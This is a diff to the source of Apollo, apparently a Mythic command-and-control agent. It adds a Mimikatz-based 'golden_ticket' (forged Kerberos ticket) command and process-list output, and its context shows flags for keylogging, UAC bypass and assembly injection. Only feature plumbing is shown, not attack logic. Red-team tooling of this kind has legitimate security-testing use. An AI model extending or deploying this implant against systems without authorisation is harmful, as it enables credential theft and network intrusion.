@@ -1,4 +1,4 @@
-﻿#define COMMAND_NAME_UPPER
+#define COMMAND_NAME_UPPER
 
 #if DEBUG
 #undef BYPASSUAC
@@ -21,6 +21,8 @@
 #define ASSEMBLY_INJECT
 #undef EXECUTE_ASSEMBLY
 #define EXECUTE_ASSEMBLY
+#undef GOLDEN_TICKET
+#define GOLDEN_TICKET
 #undef KEYLOG
 #define KEYLOG
 #undef LIST_ASSEMBLIES
@@ -133,6 +135,11 @@
 #define LIST_INJECTION_TECHNIQUES
 
 #endif
+
+#if GOLDEN_TICKET && !(MAKE_TOKEN && MIMIKATZ)
+#error GOLDEN_TICKET requires on MAKE_TOKEN and MIMIKATZ
+#endif
+
 using System.Collections.Generic;
 using Newtonsoft.Json;
 using System;
@@ -168,6 +175,7 @@ namespace Apollo
             public MythicCredential[] credentials;
             public RemovedFileInformation[] removed_files;
             public Artifact[] artifacts;
+            public ProcessEntry[] processes;
 
             public ApolloTaskResponse(Task t, object userOutput = null, Mythic.Structs.EdgeNode[] nodes = null)
             {
@@ -188,12 +196,15 @@ namespace Apollo
                 removed_files = null;
                 artifacts = null;
                 host = null;
+                processes = null;
 
                 if (userOutput != null && userOutput.GetType() != typeof(string))
                 {
                     user_output = JsonConvert.SerializeObject(userOutput);
                     if (userOutput.GetType() == typeof(Mythic.Structs.FileBrowserResponse))
                         file_browser = userOutput;
+                    else if (userOutput.GetType() == typeof(Mythic.Structs.ProcessEntry[]))
+                        processes = (Mythic.Structs.ProcessEntry[])userOutput;
                 }
                 edges = nodes;
                 if (nodes == null)
@@ -300,6 +311,9 @@ namespace Apollo
 #if JOBKILL
 
                 { "jobkill", "Jobs" },
+#endif
+#if GOLDEN_TICKET
+                { "golden_ticket", "MimikatzWrappers" },
 #endif
 #if KEYLOG
                 { "keylog", "Keylog" },
